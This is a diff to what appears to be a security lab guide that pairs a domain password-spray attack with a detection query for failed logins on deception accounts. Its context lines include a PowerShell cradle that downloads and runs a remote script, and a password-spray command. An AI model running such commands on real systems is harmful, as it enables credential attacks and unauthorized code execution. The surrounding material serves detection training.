@@ -68,6 +68,15 @@ IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/
 Invoke-DomainPasswordSpray -Password "Summer2024!" -Force
 ```
 
+The next query uses some underlying accounts, preconfigured for easy detections. Boom - failed logins on known accounts? Guess what, easy detect.
+
+```
+SecurityEvent
+| where EventID == 4625
+// remember the deception account naming conventions? 
+| where Account contains "DOLabs"
+| project TimeGenerated , Activity , Account
+```
 
 ## Attack Detect Defend - Part 2 (~09/17/24 10:00 AM)
 
